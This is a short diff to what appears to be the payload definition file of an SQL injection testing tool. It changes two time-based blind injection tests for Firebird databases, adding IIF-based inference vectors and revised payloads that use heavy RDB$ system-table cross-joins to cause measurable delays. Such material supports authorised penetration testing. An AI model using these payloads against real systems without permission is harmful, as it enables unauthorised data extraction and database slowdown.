@@ -1562,9 +1562,9 @@ Formats:
         <risk>1</risk>
         <clause>1</clause>
         <where>1</where>
-        <vector></vector>
+        <vector>AND [RANDNUM]=IIF(([INFERENCE]),(SELECT COUNT(*) FROM RDB$DATABASE AS T1, RDB$FIELDS AS T2, RDB$FUNCTIONS AS T3, RDB$TYPES AS T4, RDB$FORMATS AS T5, RDB$COLLATIONS AS T6),[RANDNUM])
         <request>
-            <payload>AND (SELECT COUNT(*) FROM RDB$DATABASE AS T1, RDB$FIELDS AS T2, RDB$FUNCTIONS AS T3, RDB$TYPES AS T4, RDB$FORMATS AS T5, RDB$COLLATIONS AS T6) > 0</payload>
+            <payload>AND [RANDNUM]=(SELECT COUNT(*) FROM RDB$DATABASE AS T1, RDB$FIELDS AS T2, RDB$FUNCTIONS AS T3, RDB$TYPES AS T4, RDB$FORMATS AS T5, RDB$COLLATIONS AS T6)</payload>
         </request>
         <response>
             <time>[DELAYED]</time>
@@ -1721,9 +1721,9 @@ Formats:
         <risk>3</risk>
         <clause>1</clause>
         <where>2</where>
-        <vector></vector>
+        <vector>OR [RANDNUM]=IIF(([INFERENCE]),(SELECT COUNT(*) FROM RDB$DATABASE AS T1, RDB$FIELDS AS T2, RDB$FUNCTIONS AS T3, RDB$TYPES AS T4, RDB$FORMATS AS T5, RDB$COLLATIONS AS T6),[RANDNUM])
         <request>
-            <payload>OR (SELECT COUNT(*) FROM RDB$DATABASE AS T1, RDB$FIELDS AS T2, RDB$FUNCTIONS AS T3, RDB$TYPES AS T4, RDB$FORMATS AS T5, RDB$COLLATIONS AS T6) > 0</payload>
+            <payload>OR [RANDNUM]=(SELECT COUNT(*) FROM RDB$DATABASE AS T1, RDB$FIELDS AS T2, RDB$FUNCTIONS AS T3, RDB$TYPES AS T4, RDB$FORMATS AS T5, RDB$COLLATIONS AS T6)</payload>
         </request>
         <response>
             <time>[DELAYED]</time>
